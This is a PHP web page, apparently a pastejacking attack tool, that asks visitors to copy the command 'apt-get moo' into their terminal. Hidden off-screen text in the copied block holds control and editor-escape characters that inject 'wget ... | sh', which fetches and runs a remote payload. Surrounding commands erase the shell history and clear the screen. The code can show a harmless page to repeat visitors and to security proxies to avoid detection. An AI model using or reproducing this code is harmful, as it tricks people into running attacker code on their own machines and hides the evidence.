<!DOCTYPE html>
<html>
  <head>
    <title>Nice shell commands</title>
  <style>
    .codeblock {
      background-color: lightyellow;
      border: 1px dotted blue;
      margin-left: 100px;
      display: inline-block;
    }
  </style>
  </head>
<body>

<?php
error_reporting(0);
// XXX array of user agents => functions to call? payloads?
// array of flags => dynamic payloads
// (vim, raw, nano, win?, ...)

//modify to quickly change behavior
$use_ipfilter=0;
$use_cookies=0;
$use_cachecookies=0;
$use_useragentfilter=0;
// XXX add more cookie methods

// Payload types/methods
// only one can be used
//$payload_type="suspend_univ";
//$payload_type="break_norm";
//$payload_type="break_vim3";
//$payload_type="break_nano";
$payload_type="break_vim4";
//$payload_command="id";

//$payload_cmdstart="history -d \"\$((HISTCMD-1))\" 2>/dev/null;history 2|grep '\#:$'>/dev/null 2>&1 && history -d \"\$((HISTCMD-2))\" 2>/dev/null;";
$payload_cmdstart="let H1=HISTCMD-1;let H2=HISTCMD-2;history -d \"\$H1\" 2>/dev/null;history 2|grep '\#:$' 2>/dev/null && history -d \"\$H2\" 2>/dev/null;";
$payload_cmdend="hash -r 2>/dev/null;clear";

$payload_command="$payload_cmdstart wget -qO- http://server1/stage1/s1cmd|sh; $payload_cmdend";

function footer() {
 print "</body>\n";
 print "</html>\n";
 return 0;
}

function harmless() {
 print "<p class=\"codeblock\">";
 print "apt-get moo";
 print "</p>\n";
 print "<p> Try running this command in your terminal. </p>\n";
 footer();
 die(0);
}

function evil1() {
 global $payload_command,$payload_type;

 print "<p class=\"codeblock\">\n";
 print "apt-get";
 print "                                                                                                                                                                                                                                                                                                                                                                                                        <span style=\"position: absolute; left: -100px; top: -10000px\">";
 // change for long command


 switch ($payload_type) {
  case "suspend_univ":
#   print "&#27;&#26;&#10;<br>";
   print "&#26;&#10;<br>";
   for ($i=0;$i<5000;$i=$i+1) {
    print("&nbsp; "); //#
   }
   print "<br>$payload_command<br>fg<br>";
   print "i";
   break;
  case "break_norm":
   print "&#3;<br>";
   print "$payload_command<br>";
   break;
  case "break_vim":
   print "&#27;#:!";
   print "$payload_command<br><br>";
//   print "&#3;";
//   print "&#3;i&#8;$payload_command<br>";
   break;
  case "test":
   print "&#27;&#26;";
   print "$payload_command<br><br>";
//   print "&#3;<br>$payload_command<br>";
//   print "i&#8;$payload_command<br>";
//   print "&#3;";
//   print "&#3;i&#8;$payload_command<br>";
   break;
  case "break_vim3":
   print "&#27;&#28;#:!";
   print "$payload_command<br><br>";
   print "#i<br>$payload_command<br>";
   print "&#27;ddddddi&#8;&#8;&#8;&#8;&#8;&#8;&#8;";
   break;
  case "break_vim4":
   print "&#27;&#28; #:<br>!!&#8;&#8; ! ";
   print "$payload_command<br>";
   print "&#27;ddi&#8;&#8;&#8;&#8;&#8;"; 
   // vim clear line + insert mode
   // one backspace is extra (ksh issue)
   // another backspace extra (ash issue)
   break;


 }

 print "apt-get</span> \n";
 print "moo\n";
 print "</p>\n";
 print "<p> Try running this command in your terminal. </p>\n";
 footer();
 die(0);
}

// dissable caching
// seems that firefox is no more affected by this when using "view source"
//header("Cache-Control: no-cache, must-revalidate"); // HTTP/1.1
//header("Expires: Sat, 26 Jul 1997 05:00:00 GMT"); // Date in the past

if ($use_ipfilter) {
 $ip = escapeshellarg($_SERVER['REMOTE_ADDR']);

 // sqlite version, not available everywhere
// $dbhandle = sqlite_open('../../wpwn/servedips.db', 0666, $error);
// if (!$dbhandle) die ("Lama");
// $query = "SELECT ip FROM ipcky where ip like '"+$ip+"'"; //XXX sqli?
// $result = sqlite_query($dbhandle, $query);
// if (!$result) die("Cannot execute query.");
// $row = sqlite_fetch_array($result, SQLITE_ASSOC); 

 // chceck if ip is already served
 system("grep '$ip' ../../wpwn/servedips >/dev/null 2>&1",$row);
 if ($row == 0) {
  harmless();
 } else {
  //save ip
  system("echo '$ip' >> ../../wpwn/servedips 2>/dev/null");
 }
}

if ($use_useragentfilter) {
 if (!(isset($_SERVER['HTTP_USER_AGENT']))) harmless();
 $uagent=$_SERVER['HTTP_USER_AGENT'];
} // else {
//  $uagent="";
//}

#echo "$uagent";

if (($use_cookies) && (isset($_COOKIE['aptgetmoo']))) {
 harmless();
}

// filter out paros/ burpsuite if verbose XXX
if (($use_useragentfilter) && (preg_match("/paros/i",$uagent))) {
 harmless();
}

// case?
if ((($use_useragentfilter) && ((preg_match("/^Mozilla\//",$uagent))))
   || (! $use_useragentfilter)) {
 if ( $use_cookies ) {
  setcookie("aptgetmoo","aptgetmoo",time() + 86400*3); // 86400 = 1 day
 }
 evil1();
}
// chrome?
//echo "test3: $uagent : test3\n";

harmless();
?>
